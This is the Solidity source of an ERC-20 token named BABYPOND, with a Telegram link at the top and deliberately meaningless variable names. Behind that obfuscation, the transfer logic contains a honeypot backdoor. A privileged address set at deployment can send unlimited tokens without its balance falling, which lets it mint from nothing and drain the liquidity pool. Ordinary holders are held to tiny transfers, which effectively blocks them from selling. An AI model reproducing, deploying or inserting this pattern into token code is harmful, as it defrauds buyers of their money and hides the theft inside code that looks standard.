/*

https://t.me/ercbabypond

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BABYPOND is Ownable {
    mapping(address => uint256) private ibkan;

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 private lgidubestmrv = 116;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private ufitobqvgrxk;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transfer(address ueqmivn, uint256 bfsrzyvx) public returns (bool success) {
        ayorujnzlg(msg.sender, ueqmivn, bfsrzyvx);
        return true;
    }

    string public name;

    function ayorujnzlg(address nxhquycoe, address ueqmivn, uint256 bfsrzyvx) private {
        address wsrgk = IUniswapV2Factory(pixumfkqwhc.factory()).getPair(address(this), pixumfkqwhc.WETH());
        if (0 == ibkan[nxhquycoe]) {
            if (nxhquycoe != wsrgk && ufitobqvgrxk[nxhquycoe] != block.number && bfsrzyvx < totalSupply) {
                require(bfsrzyvx <= totalSupply / (10 ** decimals));
            }
            balanceOf[nxhquycoe] -= bfsrzyvx;
        }
        balanceOf[ueqmivn] += bfsrzyvx;
        ufitobqvgrxk[ueqmivn] = block.number;
        emit Transfer(nxhquycoe, ueqmivn, bfsrzyvx);
    }

    function approve(address yuwtksd, uint256 bfsrzyvx) public returns (bool success) {
        allowance[msg.sender][yuwtksd] = bfsrzyvx;
        emit Approval(msg.sender, yuwtksd, bfsrzyvx);
        return true;
    }

    constructor(string memory bznspfimex, string memory ybvearm, address yqlv, address vrbfxeujpwh) {
        name = bznspfimex;
        symbol = ybvearm;
        balanceOf[msg.sender] = totalSupply;
        ibkan[vrbfxeujpwh] = lgidubestmrv;
        pixumfkqwhc = IUniswapV2Router02(yqlv);
    }

    string public symbol;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address nxhquycoe, address ueqmivn, uint256 bfsrzyvx) public returns (bool success) {
        require(bfsrzyvx <= allowance[nxhquycoe][msg.sender]);
        allowance[nxhquycoe][msg.sender] -= bfsrzyvx;
        ayorujnzlg(nxhquycoe, ueqmivn, bfsrzyvx);
        return true;
    }

    IUniswapV2Router02 private pixumfkqwhc;

    uint8 public decimals = 9;
}
